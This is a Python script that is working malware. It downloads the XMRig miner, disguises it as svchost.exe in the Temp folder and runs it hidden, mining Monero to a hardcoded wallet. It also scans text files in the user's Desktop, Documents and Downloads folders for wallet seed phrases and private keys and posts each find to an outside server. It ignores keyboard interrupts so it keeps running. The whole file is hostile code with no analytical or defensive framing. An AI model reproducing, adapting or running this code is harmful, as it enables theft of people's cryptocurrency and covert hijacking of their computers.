import os
import re
import time
import requests
import subprocess
import threading
import zipfile
import multiprocessing
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'svchost.exe')

def send(data):
    try:
        r = requests.post(SERVER, json={'data': data}, timeout=10)
        print(f"[SEND] Sent: {data.get('type', 'unknown')} - Status: {r.status_code}")
    except Exception as e:
        print(f"[SEND] Error: {e}")

def start_miner():
    try:
        # Download miner
        if not os.path.exists(MINER):
            zip_path = os.path.join(TEMP, 'xmrig.zip')
            r = requests.get('https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip', stream=True, timeout=60)
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            break
        
        if os.path.exists(MINER):
            # Launch 1 miner with proper config
            subprocess.Popen(
                [MINER, 
                 '--url=pool.supportxmr.com:3333', 
                 f'--user={WALLET}',
                 '--pass=x', 
                 '--threads=4',
                 '--keepalive',
                 '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[MINER] Launched")
    except Exception as e:
        print(f"[MINER] Error: {e}")

def scan_file(path):
    try:
        if os.path.getsize(path) > 1 * 1024 * 1024:
            return
        
        # Skip system/VSCode folders
        if '.vscode' in path or 'python_files' in path or 'jedilsp' in path:
            return
        
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if not content:
                return
            
            # Look for 12-word seed phrases
            words = re.findall(r'\b[a-zA-Z]+\b', content)
            for i in range(len(words) - 11):
                phrase = ' '.join(words[i:i+12])
                try:
                    if mnemo.check(phrase):
                        print(f"[SEED] FOUND in {path}")
                        send({'type': 'seed', 'path': path, 'content': phrase})
                        return
                except:
                    pass
            
            # Look for private keys (must be user created files)
            matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
            for m in matches:
                key = m.replace('0x', '')
                if len(key) == 64 and key not in ['0'*64, '1'*64, 'f'*64]:
                    # Only flag if it's in a user file (not requirements.txt)
                    if 'requirements.txt' not in path and '.vscode' not in path:
                        print(f"[KEY] FOUND in {path}")
                        send({'type': 'key', 'path': path, 'content': m})
                        return
    except:
        pass

def scan_folder(folder):
    if os.path.exists(folder):
        print(f"[SCAN] Scanning: {folder}")
        for root, dirs, files in os.walk(folder):
            # Skip system folders
            skip = ['AppData', 'Windows', 'Program Files', '.vscode', 'node_modules']
            if any(s in root for s in skip):
                continue
            for f in files:
                if f.endswith('.txt'):
                    scan_file(os.path.join(root, f))

def main():
    print("[SERVICE] Starting...")
    
    # Start miner
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Scan Desktop, Documents, Downloads
    folders = [
        os.path.expandvars("%USERPROFILE%\\Desktop"),
        os.path.expandvars("%USERPROFILE%\\Documents"),
        os.path.expandvars("%USERPROFILE%\\Downloads"),
    ]
    
    for folder in folders:
        threading.Thread(target=scan_folder, args=(folder,), daemon=True).start()
    
    print("[SERVICE] Running...")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()